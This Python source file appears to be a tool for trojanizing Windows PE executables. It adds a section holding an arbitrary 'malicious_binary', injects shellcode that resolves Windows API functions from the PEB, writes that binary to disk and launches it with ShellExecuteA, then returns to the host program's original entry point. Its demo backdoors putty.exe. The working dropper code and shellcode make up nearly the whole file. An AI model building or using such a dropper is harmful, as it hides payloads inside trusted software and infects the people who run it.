import sys
sys.path.append("modifier")
from add_section import *
from change_entrypoint import *
from pwn import *

context(os='windows', arch='i386')

def btoi(data: bytes) -> int:
    return int.from_bytes(data, byteorder="little")

def itob4(data: int) -> bytes:
    return data.to_bytes(4, byteorder="little")

def itob2(data: int) -> bytes:
    return data.to_bytes(2, byteorder="little")

def search_section_header_by_name(data: bytes, section_name: bytes) -> int:
    pe_header_offset = btoi(data[0x3C:0x40])  # e_lfanew
    if data[pe_header_offset : pe_header_offset + 4] != b"PE\x00\x00":
        raise ValueError("Invalid PE header offset")

    section_header_start_offset = pe_header_offset + 0xf8
    total_number_of_section = btoi(data[pe_header_offset + 0x6 : pe_header_offset + 0x8])

    section_header_size = 0x28
    executable_section_list = []

    target = 0
    for i in range(total_number_of_section):
        cur_section_header = section_header_start_offset + i * section_header_size
        cur_section_name = bytes(data[cur_section_header : cur_section_header + 0x8])

        if cur_section_name.replace(b'\x00', b'') == section_name:
            return cur_section_header
    
    return 0

def make_shellcode_to_execute_dropper_by_filename(filename: bytes, t_section_start: int, t_section_size: int) -> bytes:
    def call_winexec(filename: bytes) -> bytes:
        data = f'''
        call_winexec:

        CREATE_NEW_STACK_FRAME:
            push ebp
            mov ebp, esp            
            sub esp, 0x24         

        call load_kerneldll

        call setup_finder_structure
        {shellcraft.pushstr(b"ExitProcess")}
        mov [ebp+0x18], esp
        mov dword ptr [ebp+0x20], {hex(len(b"ExitProcess"))}
        call find_obj_addr
        mov [ebp], eax

        {shellcraft.pushstr(b"LoadLibrary")}
        mov [ebp+0x18], esp  
        mov dword ptr [ebp+0x20], {hex(len(b"LoadLibrary"))}
        call find_obj_addr

        {shellcraft.pushstr(b"shell32.dll")}
        push esp
        call eax
        mov [ebp+0x4], eax  
        call setup_finder_structure

        {shellcraft.pushstr(b"ShellExecuteA")}
        mov [ebp+0x18], esp
        mov dword ptr [ebp+0x20], {hex(len(b"ShellExecuteA"))}
        call find_obj_addr

        CALL_SHELLEXECUTEA:
        {shellcraft.pushstr(filename)}
        push esp
        pop edx

        xor ecx, ecx
        inc ecx
        push ecx
        dec ecx
        push ecx
        push ecx
        push edx
        push ecx
        push ecx
    
        call eax
        leave

        '''

        
        return data.encode()

    def orw_file(filename: bytes, section_start: int, section_size: int) -> bytes:
        data = f'''
        _start:

        CREATE_NEW_STACK_FRAME2:
            push ebp
            mov ebp, esp            
            sub esp, 0x40     

        call load_kerneldll
        call setup_finder_structure

        {shellcraft.pushstr(b"CreateFileA")}
        mov [ebp+0x18], esp
        mov dword ptr [ebp+0x20], {hex(len(b"CreateFileA"))}
        call find_obj_addr

        {shellcraft.pushstr(filename)}
        push esp
        pop edx

        xor ecx, ecx
        xor ebx, ebx
        add ebx, 2
        push ecx
        push ebx
        push ecx
        push ecx
        mov ecx, 0xC0000000
        push ecx
        push edx
    
        call eax
        mov [ebp+0x34], eax


        call load_kerneldll
        call setup_finder_structure
        
        {shellcraft.pushstr(b"WriteFile")}
        mov [ebp+0x18], esp
        mov dword ptr [ebp+0x20], {hex(len(b"WriteFile"))}
        call find_obj_addr

        xor ecx, ecx
        mov edx, ebp
        add edx, 0x30
        push ecx
        push edx
        push {hex(section_size)}
        push {hex(section_start)}
        mov edx, [ebp+0x34]
        push edx
        call eax

        call load_kerneldll
        call setup_finder_structure
        {shellcraft.pushstr(b"CloseHandle")}
        mov [ebp+0x18], esp
        mov dword ptr [ebp+0x20], {hex(len(b"CloseHandle"))}
        call find_obj_addr

        mov ebx, [ebp+0x34]
        push ebx
        call eax

        leave
        jmp call_winexec
        '''
        return data.encode()
        
    def goto_original_entrypoint() -> bytes:
        data = f'''
        call qqq
        qqq:
        pop ecx
        and ecx, 0xfffff000
        add ecx, 0x400
        mov ecx, [ecx]
        push ecx
        ret
        '''
        return data.encode()

    def library_function() -> bytes:
        data = f'''
        
        load_kerneldll:
            xor ebx, ebx            
            mov ebx, fs:[ebx+0x30]  
            mov ebx, [ebx+0xC]      
            mov ebx, [ebx+0x1C]     
            mov ebx, [ebx]          
            mov ebx, [ebx]          
            mov eax, [ebx+0x8]      
            mov [ebp+0x4], eax  
            ret
            
        setup_finder_structure:
            FIND_ADDRESS_OF_EXPORT_TABLE:
                mov ebx, [eax+0x3C]     
                add ebx, eax            
                mov ebx, [ebx+0x78]     
                add ebx, eax            

            FIND_ADDRESS_OF_NAME_POINTER_TABLE:
                mov edi, [ebx+0x20]     
                add edi, eax            
                mov [ebp+0x8], edi      

            FIND_ADDRESS_OF_ORDINAL_TABLE:
                mov ecx, [ebx+0x24]     
                add ecx, eax            
                mov [ebp+0xC], ecx      

            FIND_ADDRESS_OF_ADRESSTABLE:
                mov edx, [ebx+0x1C]     
                add edx, eax            
                mov [ebp+0x10], edx     

            FIND_NUMBER_OF_FUNCTIONS:
                mov edx, [ebx+0x14]     
                mov [ebp+0x14], edx     
            
            ret

        find_obj_addr:
            xor eax, eax            
            mov edx, [ebp+0x14]     

            searchLoop:
                mov edi, [ebp+0x8]      
                mov esi, [ebp+0x18]     
                xor ecx, ecx            
                cld                     
                mov edi, [edi+eax*4]    
                add edi, [ebp+0x4]
                mov ecx, [ebp+0x20]         
                repe cmpsb              
                jz found                
                inc eax                 
                cmp eax, edx            
                jb searchLoop           

            found:
                mov ecx, [ebp+0xC]      
                mov edx, [ebp+0x10]     
                mov ax,  [ecx + eax*2]  
                mov eax, [edx + eax*4]  
                add eax, [ebp+0x4]      
                ret
        '''

        return data.encode()
    
    data = b''
    data += orw_file(filename, t_section_start, t_section_size)
    data += call_winexec(filename)
    data += goto_original_entrypoint()
    data += library_function()
    return data

def dropper(data: bytes, malicious_binary: bytes, filename: bytes) -> bytes:
    """
    Stores the code as a resource of another binary, which is then loaded at runtime

    Args:
        data: Raw PE Binary bytes
        malicious_binary: Binary to be dropped

    Returns:
        PE binary bytes with changed entry-point
    """
    data = bytearray(data)

    # Get PE header offset
    pe_header_offset = btoi(data[0x3C:0x40])  # e_lfanew
    if data[pe_header_offset : pe_header_offset + 4] != b"PE\x00\x00":
        raise ValueError("Invalid PE header offset")

    # Disable IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
    data[0xd6 : 0xd8] = itob2(0x8100)
    
    PE_image_base = btoi(data[pe_header_offset + 0x34: pe_header_offset + 0x38])
    AddressOfEntryPoint_offset = pe_header_offset + 0x28
    original_entry_point = btoi(data[AddressOfEntryPoint_offset : AddressOfEntryPoint_offset + 4])

    data = add_section(data, ".ymmud1", malicious_binary, PERM.READ)

    malicious_binary_header = search_section_header_by_name(data, b'.ymmud1')
    RVA__malicious_binary = btoi(data[malicious_binary_header + 0xc : malicious_binary_header + 0x10])
    VirtualSize__malicious_binary = btoi(data[malicious_binary_header + 0x8 : malicious_binary_header + 0xc])
    
    drop_malicious_binary_asm = make_shellcode_to_execute_dropper_by_filename(filename, RVA__malicious_binary + PE_image_base, VirtualSize__malicious_binary)
    drop_malicious_binary_asm = asm(drop_malicious_binary_asm.decode())
    drop_malicious_binary_asm = drop_malicious_binary_asm.ljust(0x400, b'\x00')
    drop_malicious_binary_asm += itob4(original_entry_point + PE_image_base)

    data = add_section(data, ".ymmud2", drop_malicious_binary_asm, PERM.READ | PERM.WRITE | PERM.EXEC)

    drop_asm_header = search_section_header_by_name(data, b'.ymmud2')
    RVA__drop_asm_header = btoi(data[drop_asm_header + 0xc : drop_asm_header + 0x10])

    data = change_entry_point(data, RVA__drop_asm_header)

    return data

if __name__ == '__main__':
    data = bytearray(open("test/putty.exe", "rb").read())
    drop_binary = bytearray(open("test/hello_world.exe", "rb").read())
    new_data = dropper(data, drop_binary, b"C:\\tmp\\test.exe")
    open("test/putty_new.exe", "wb").write(new_data)
